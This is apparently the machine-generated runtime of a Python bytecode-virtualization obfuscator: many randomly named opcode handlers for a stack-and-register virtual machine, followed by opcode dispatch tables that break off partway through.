def _xqd30(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 del registers[arg[0]][registers[arg[1]]]
def _xp46b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]]
def _xi9da(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left * right)
def _xk8d1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = getattr(registers[arg[1]], names[arg[2]])
def _xn6ab(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack[-1] = not stack[-1]
def _xg282(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[13]; registers[1] = _b_0_c; _b_1_c = consts[14]
 registers[2] = _b_1_c; _b_2_c = consts[10]; registers[3] = _b_2_c
 _b_3_c = consts[6]; registers[4] = _b_3_c; _b_4_c = consts[15]
 registers[5] = _b_4_c
def _xt216(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left != right)
def _xveca(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _ufcpkjcsl = stack.pop(); _oc3c54ws = stack.pop()
 stack.append(_oc3c54ws << _ufcpkjcsl)
def _xw608(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_0 = stack.pop(); locals_dict[names[1]] = _b_0_0
def _dq120(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xs7c0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 del stack[-1]
def _xc817(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]][registers[arg[2]]]
def _xbec1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._z5a0l725 = arg
def _xgc68(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack[-1], stack[-2] = (stack[-2], stack[-1])
def _xxff7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack[-1] = ~stack[-1]
def _xu1f1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _dst, _fn, _fl = arg; _args = registers[_fn + 1]
 _kwargs = registers[_fn + 2] if _fl & 1 else {}
 registers[_dst] = registers[_fn](*_args, **_kwargs)
def _xidf3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left // right)
def _xe4f2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.extend(stack[-2:])
def _xna8a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if registers[arg[0]]:
  frame._z5a0l725 = arg[1]
def _xdeed(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop()
 stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xvb5e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 locals_dict[names[arg]] = stack.pop()
def _xx66d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 while len(fastlocals) <= arg[1]:
  fastlocals.append(None)
 fastlocals[arg[1]] = fastlocals[arg[0]]
def _xr483(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] + registers[arg[2]]
def _xv630(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _f7siwjm2, _c8qizk3c9, _udntcagr = arg
 registers[_f7siwjm2] = registers[_c8qizk3c9] + registers[_udntcagr]
def _xmf70(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_v = fastlocals[8]; registers[2] = _b_0_v; _b_1_c = consts[19]
 registers[3] = _b_1_c; _b_2_c = consts[47]; registers[4] = _b_2_c
def _xabe2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _pxo1bdje1 = names[arg]; _qxtogn1w = stack.pop()
 delattr(_qxtogn1w, _pxo1bdje1)
def _xs242(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _hm6cfnfho = stack[-1]; stack[-1] = stack[-2]; stack[-2] = stack[-3]
 stack[-3] = _hm6cfnfho
def _xu3bc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg[0]] * consts[arg[1]])
def _xuc02(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 try:
  registers[arg[1]] = next(registers[arg[0]])
 except StopIteration:
  frame._z5a0l725 = arg[2]
def _xcd2b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] % registers[arg[2]]
def _drc41(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xo10d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _val = stack.pop(); registers[arg] = _val
def _djac9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xceaf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 while len(fastlocals) <= arg[0]:
  fastlocals.append(None)
 fastlocals[arg[0]] = registers[arg[1]]
def _xp754(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[26]; registers[6] = _b_0_c; _b_1_c = consts[19]
 registers[7] = _b_1_c; _b_2_c = consts[21]; registers[8] = _b_2_c
def _xj47b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d, _b, _c = arg; registers[_d] = tuple((registers[_b + i] for i in range(_c)))
def _xzec9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]].add(registers[arg[1]])
def _xs4f0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._el6246hi.append(_mt3w5uzb(_kdd4v30t.FINALLY, arg, len(stack)))
def _xd4fa(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 code_obj = stack.pop(); kw_defaults = stack.pop() if arg & 2 else {}
 defaults = stack.pop() if arg & 1 else (); closure = []
 if code_obj.freevars:
  for var in code_obj.freevars:
   if var in frame._vljexq77aw.cellvars:
    closure.append(frame._ia1wj0tp[frame._vljexq77aw.cellvars.index(var)])
   elif var in frame._vljexq77aw.freevars:
    closure.append(frame._ia1wj0tp[len(frame._vljexq77aw.cellvars) + frame._vljexq77aw.freevars.index(var)])
 fn = _uuy41ibljh(code=code_obj, globals_dict=globals_dict, defaults=defaults, kw_defaults=kw_defaults, closure=tuple(closure))
 stack.append(fn)
def _xr264(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.pop()
def _xt42e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _t0_1 = stack.pop(); _t0_0 = stack.pop(); _t0_res = _t0_0 != _t0_1
 _t1_0 = _t0_res; _t1_res = not _t1_0; stack.append(_t1_res)
def _xl39a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left << right)
def _xf218(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[25]; registers[5] = _b_0_c; _b_1_c = consts[19]
 registers[6] = _b_1_c; _b_2_c = consts[19]; registers[7] = _b_2_c
def _xb4aa(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1
 stack[-depth].update(val)
def _xh6e9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _ohw06xkxb9 = stack.pop(); _myr6ccvcj = stack.pop()
 stack.append(_myr6ccvcj / _ohw06xkxb9)
def _xn793(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_v = fastlocals[8]; registers[2] = _b_0_v; _b_1_c = consts[19]
 registers[3] = _b_1_c; _b_2_c = consts[47]; registers[4] = _b_2_c
def _xu91f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(stack[-1])
def _xdf3e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _d0_c = consts[arg]; registers[0] = _d0_c; _d1_ret = registers[0]
 frame._ixo9t7e8g = _d1_ret; return _RET_SIGNAL
def _xx2d5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[38]; registers[17] = _b_0_c; _b_1_c = consts[37]
 registers[18] = _b_1_c; _b_2_c = consts[19]; registers[19] = _b_2_c
def _xle8f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_v = registers[3]
 while len(fastlocals) <= 4:
  fastlocals.append(None)
 fastlocals[4] = _b_0_v; _b_1_v = registers[2]
 while len(fastlocals) <= 5:
  fastlocals.append(None)
 fastlocals[5] = _b_1_v; _b_2_v = registers[1]
 while len(fastlocals) <= 6:
  fastlocals.append(None)
 fastlocals[6] = _b_2_v; _n = names[4]
 _b_3_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
 stack.append(_b_3_0)
def _xf574(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if not stack[-1]:
  frame._z5a0l725 = arg
def _xi20f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 pass
def _xr291(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg])
def _dzb76(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xvf28(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 args = stack[-arg:] if arg > 0 else []
 if arg > 0:
  del stack[-arg:]
 func = stack.pop()
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  args = [func.__self__] + list(args); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, args, {}, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*args))
def _xc99a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if arg == 0:
  raise
 elif arg == 1:
  raise stack.pop()
 elif arg == 2:
  cause = stack.pop(); exc = stack.pop(); raise exc from cause
def _xid4c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(iter(stack.pop()))
def _xe927(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack[-1] = -stack[-1]
def _xh915(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 while len(fastlocals) <= arg:
  fastlocals.append(None)
 fastlocals[arg] = stack.pop()
def _xm242(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if not stack[-1]:
  frame._z5a0l725 = arg
 else:
  stack.pop()
def _xaa95(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left >> right)
def _xc1bb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[24]; registers[4] = _b_0_c; _b_1_c = consts[19]
 registers[5] = _b_1_c; _b_2_c = consts[17]; registers[6] = _b_2_c
def _xq384(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 attr_idx, argc = arg; name = names[attr_idx]
 args = stack[-argc:] if argc > 0 else []
 if argc > 0:
  del stack[-argc:]
 obj = stack.pop(); func = getattr(obj, name)
 if isinstance(func, _types.MethodType) and isinstance(func.__func__, _uuy41ibljh):
  args = [func.__self__] + list(args); func = func.__func__
 if isinstance(func, _uuy41ibljh):
  _fl = _azytjxepq8(func.code, args, {}, func.defaults, func.kw_defaults)
  frame._sjza7tz0 = _vzycwtiqj(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
 else:
  stack.append(func(*args))
def _xr31d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _rmoge4qxxv = stack.pop(); _a2ieuc1h = stack.pop()
 stack.append(_a2ieuc1h * _rmoge4qxxv)
def _xu671(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[35]; registers[15] = _b_0_c; _b_1_c = consts[23]
 registers[16] = _b_1_c; _b_2_c = consts[23]; registers[17] = _b_2_c
def _xc47f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 fastlocals[arg] = None
def _xha6a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _dst, _idx = arg; registers[_dst] = fastlocals[_idx]
def _xv4a5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left / right)
def _xre60(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 frame._ixo9t7e8g = fastlocals[arg]; return _RET_SIGNAL
def _xz38d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] >> registers[arg[2]]
def _xide9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _dst, _fn, _argc = arg
 registers[_dst] = registers[_fn](*[registers[_fn + 1 + i] for i in range(_argc)])
def _xh492(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = consts[arg[1]]
def _xh214(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if stack[-1]:
  frame._z5a0l725 = arg
def _xqfb2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _sqpgb7r3o = names[arg]
 if _sqpgb7r3o in globals_dict:
  del globals_dict[_sqpgb7r3o]
 else:
  raise NameError(f"name '{_sqpgb7r3o}' is not defined")
def _xn8c5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 ctx_mgr = stack.pop(); enter_fn = getattr(ctx_mgr, '__enter__')
 exit_fn = getattr(ctx_mgr, '__exit__'); res = enter_fn()
 frame._el6246hi.append(_mt3w5uzb(_kdd4v30t.WITH, arg, len(stack), exit_fn=exit_fn))
 stack.append(res)
def _xj386(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[33]; registers[13] = _b_0_c; _b_1_c = consts[23]
 registers[14] = _b_1_c; _b_2_c = consts[19]; registers[15] = _b_2_c
def _xlf0f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _roaztkszp7 = stack.pop(); frame._ixo9t7e8g = _roaztkszp7; return _RET_SIGNAL
def _xxd88(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left in right)
def _xhedd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _idx, _src = arg
 while len(fastlocals) <= _idx:
  fastlocals.append(None)
 fastlocals[_idx] = registers[_src]
def _xu5cc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 try:
  stack.append(next(stack[-1]))
 except StopIteration:
  stack.pop(); frame._z5a0l725 = arg
def _xb771(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(getattr(fastlocals[arg[0]], names[arg[1]]))
def _xr5b0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _ahafeyuh = names[arg]
 if _ahafeyuh in locals_dict:
  stack.append(locals_dict[_ahafeyuh])
 elif _ahafeyuh in globals_dict:
  stack.append(globals_dict[_ahafeyuh])
 elif _ahafeyuh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _ahafeyuh in builtins_dict:
  stack.append(builtins_dict[_ahafeyuh])
 else:
  raise NameError(f"name '{_ahafeyuh}' is not defined")
def _xk1ea(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(fastlocals[arg[0]] + consts[arg[1]])
def _xc728(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _n = names[arg]
 if _n in locals_dict:
  del locals_dict[_n]
 elif _n in globals_dict:
  del globals_dict[_n]
 else:
  raise NameError(f"name '{_n}' is not defined")
def _xd166(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]].append(registers[arg[1]])
def _xt16c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _g2m5zja8d = stack.pop()
 if arg >= len(fastlocals):
  fastlocals.extend([None] * (arg - len(fastlocals) + 1))
 fastlocals[arg] = _g2m5zja8d
def _xe53c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 cmp_arg, target_pc = arg; right = stack.pop(); left = stack.pop(); res = False
 if cmp_arg == 0:
  res = left < right
 elif cmp_arg == 1:
  res = left <= right
 elif cmp_arg == 2:
  res = left == right
 elif cmp_arg == 3:
  res = left != right
 elif cmp_arg == 4:
  res = left > right
 elif cmp_arg == 5:
  res = left >= right
 elif cmp_arg == 6:
  res = left in right
 elif cmp_arg == 7:
  res = left not in right
 elif cmp_arg == 8:
  res = left is right
 elif cmp_arg == 9:
  res = left is not right
 elif cmp_arg == 10:
  res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
 if not res:
  frame._z5a0l725 = target_pc
def _xrd75(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if stack.pop():
  frame._z5a0l725 = arg
def _xyff8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left - right)
def _xy662(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 stack.append(consts[arg])
def _xwb65(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if not stack.pop():
  frame._z5a0l725 = arg
def _xvc75(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = frame._ia1wj0tp[arg[1]].val
def _xgf9c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[9]; registers[1] = _b_0_c; _b_1_c = consts[10]
 registers[2] = _b_1_c; _b_2_c = consts[10]; registers[3] = _b_2_c
 _b_3_c = consts[11]; registers[4] = _b_3_c; _b_4_c = consts[12]
 registers[5] = _b_4_c
def _xi971(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[31]; registers[11] = _b_0_c; _b_1_c = consts[21]
 registers[12] = _b_1_c; _b_2_c = consts[23]; registers[13] = _b_2_c
def _xxc09(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left is right)
def _dve12(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame is None:
  return None
 return (getattr(frame, '_z5a0l725', 0) ^ 90) & 255
def _xi755(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _rpv60vaiy = names[arg]; _s89yjb1qx6 = stack.pop(); _fp38qoldfo = stack.pop()
 setattr(_s89yjb1qx6, _rpv60vaiy, _fp38qoldfo)
def _xu293(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left ^ right)
def _xbb6f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _x8j3trp0j4 = fastlocals[arg]; stack.append(_x8j3trp0j4)
def _xrcaa(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 seq = list(stack.pop())
 if len(seq) != arg:
  raise ValueError(f'need more than {len(seq)} values to unpack (expected {arg})')
 for item in reversed(seq):
  stack.append(item)
def _xo977(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] ** registers[arg[2]]
def _xb3a2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] ^ registers[arg[2]]
def _xh39d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = not registers[arg[1]]
def _xz783(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 const_idx, var_idx = arg
 while len(fastlocals) <= var_idx:
  fastlocals.append(None)
 fastlocals[var_idx] = consts[const_idx]
def _xx9fb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _l = registers[arg[0]]; _r = registers[arg[1]]; _c = arg[2]; _res = False
 if _c == 0:
  _res = _l < _r
 elif _c == 1:
  _res = _l <= _r
 elif _c == 2:
  _res = _l == _r
 elif _c == 3:
  _res = _l != _r
 elif _c == 4:
  _res = _l > _r
 elif _c == 5:
  _res = _l >= _r
 elif _c == 6:
  _res = _l in _r
 elif _c == 7:
  _res = _l not in _r
 elif _c == 8:
  _res = _l is _r
 elif _c == 9:
  _res = _l is not _r
 elif _c == 10:
  _res = isinstance(_l, _r) or (isinstance(_l, type) and issubclass(_l, _r))
 registers[arg[0]] = _res
def _xu857(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[27]; registers[7] = _b_0_c; _b_1_c = consts[19]
 registers[8] = _b_1_c; _b_2_c = consts[23]; registers[9] = _b_2_c
def _xy5a1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 right = stack.pop(); left = stack.pop(); stack.append(left <= right)
def _xcc53(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _b_0_c = consts[39]; registers[18] = _b_0_c; _b_1_c = consts[37]
 registers[19] = _b_1_c; _b_2_c = consts[21]; registers[20] = _b_2_c
def _xrb97(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if not registers[arg[0]]:
  frame._z5a0l725 = arg[1]
def _xlaa8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _dst, _nidx, _flreg = arg
 _nm = consts[_nidx] if isinstance(consts, (list, tuple)) and _nidx < len(consts) and isinstance(consts[_nidx], str) else names[_nidx]
 registers[_dst] = __import__(_nm, globals_dict, locals_dict, registers[_flreg], 0)
def _xg918(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if arg == 0:
  stack.append([])
 else:
  items = stack[-arg:]; del stack[-arg:]; stack.append(items)
def _xbcac(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 registers[arg[0]] = registers[arg[1]] - registers[arg[2]]
def _xgb7c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _cdyk0x65m = stack.pop(); _sfm8zov7ln = stack.pop()
 stack.append(_sfm8zov7ln >> _cdyk0x65m)
def _xuae5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 _ahafeyuh = names[arg]; _w1gv0e38d = locals_dict
 if _ahafeyuh in _w1gv0e38d:
  stack.append(_w1gv0e38d[_ahafeyuh])
 elif _ahafeyuh in globals_dict:
  stack.append(globals_dict[_ahafeyuh])
 elif _ahafeyuh == 'super':
  def _ya07h23c42(*args):
   if not args:
    if hasattr(frame, '_zj2d54i3') and frame._zj2d54i3 and hasattr(frame._zj2d54i3, '__class_owner__') and frame._v7eedtjv:
     return _builtins.super(frame._zj2d54i3.__class_owner__, frame._v7eedtjv[0])
   return _builtins.super(*args)
  stack.append(_ya07h23c42)
 elif builtins_dict and _ahafeyuh in builtins_dict:
  stack.append(builtins_dict[_ahafeyuh])
 else:
  raise NameError(f"name '{_ahafeyuh}' is not defined")
def _xoaf0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
 if frame._d25owf759 is not None:
  frame._d25owf759(None, None, None); frame._d25owf759 = None
_cT_f5af = {0: {9990: _xa2ca, 9566: _xf574, 11822: _xuae5, 11870: _xs242, 10090: _xxd88, 8510: _xv89a, 12130: _xn387, 9110: _xhedd, 8926: _xecc8, 15150: _xp4e3, 10262: _xw7c3, 8434: _xd4f7, 11414: _xl482, 10846: _xcabf, 9770: _xba44, 12190: _xma88, 10266: _xz38d, 15294: _xebbf, 10802: _xk76b, 10330: _xle8f, 9482: _xr264, 10346: _xe471, 11694: _xp754, 8738: _xz891, 9834: _xk1ea, 10762: _xsf05, 10894: _xr483, 10414: _xr42e, 14598: _dq120, 12010: _xe6fb, 11514: _xp274, 11234: _xceaf, 9262: _xa27e, 14822: _xq384, 14346: _xi444, 9266: _xre60, 8918: _xxff7, 15022: _xsa38, 10118: _xo10d, 9726: _xb771, 14518: _xh915, 9258: _xh3a9, 9418: _xk222, 11158: _xm242, 11262: _xc1bb, 14714: _xwb65, 15354: _xo712, 9454: _dq120, 15262: _xr42e, 10190: _dzb76, 10898: _xuc02, 14434: _xk4d1, 11846: _xpe0e, 9554: _xo4ff, 11330: _xl6af, 9762: _xbcf7, 8630: _xrd40, 8526: _xl802, 8246: _xk156, 9526: _xzec9, 15018: _xla3c, 11554: _xr534, 9994: _xh492, 10178: _xm53e, 10034: _xzd8f, 14674: _xce9f, 11702: _xgb7c, 14470: _xdf3e, 11490: _xu38f, 15246: _xu5cc}, 1: {9935: _xj47b, 10943: _xrcaa, 9323: _xp46b, 9583: _xr82d, 8535: _dv2a8, 12127: _xxf03, 10023: _xo590, 10147: _drc41, 15091: _xcf11, 11603: _dr5ca, 9043: _xp46d, 14507: _xf218, 8503: _xlf0f, 10935: _xgbb9, 11795: _xa2ca, 14367: _xs95d, 10303: _xidf3, 14631: _xb920, 12143: _xu671, 9547: _xvb5e, 11791: _dzb76, 10363: _xk572, 9359: _xceaf, 10883: _xv630, 8287: _xh11d, 14583: _xs4f0, 12195: _xc728, 14495: _xt216, 10199: _xm108, 9211: _dve12, 11971: _xaa95, 11959: _xgc45, 10451: _xoa6d, 8467: _xxc09, 11675: _xu857, 8507: _xi971, 11003: _xyd6a, 10307: _xo994, 14751: _xr291, 12175: _xi9da, 10807: _xbde1, 12231: _xx2d5, 10991: _xd27b, 14731: _xp90b, 12115: _xx536, 11351: _xna8a, 11031: _xn486, 11967: _xqd30, 8771: _xn793, 10203: _xb3a2, 10839: _xw608, 9111: _xy395, 9051: _xibb4, 9987: _xnc25, 10327: _xlaa8, 15247: _xo60f, 11583: _xe4f2, 11951: _xdeed, 15195: _xg918, 8491: _xgfdc, 11619: _djac9, 14531: _xr5b0, 10519: _xxf46}, 2: {9700: _xx66d, 15104: _xc99a, 12148: _xid4c, 11584: _xnf5d, 11856: _xccb5, 11244: _xy5a1, 10556: _xdbd3, 8528: _xj762, 11392: _xe927, 14476: _xveca, 10336: _xm28c, 11084: _xu3bc, 14532: _xva56, 14836: _xy662, 12248: _xabe2, 10160: _xmf70, 14568: _xbae8, 11500: _xd372, 9616: _xvb74, 8760: _xsa38, 14724: _xn387, 14444: _xvc75, 11920: _xu91f, 14464: _xd714, 15280: _xr483, 8336: _djac9, 9624: _xoed2, 10908: _xo712, 14360: _xkff4, 15148: _xc126, 11860: _xifce, 11040: _djac9, 8504: _xt7c5, 12032: _xw9b8, 11908: _xt42e, 11652: _xs7c0, 11576: _xx9fb, 10788: _xi20f, 8652: _xe30d, 10936: _xh39d, 10416: _xh915, 15112: _xoaf0, 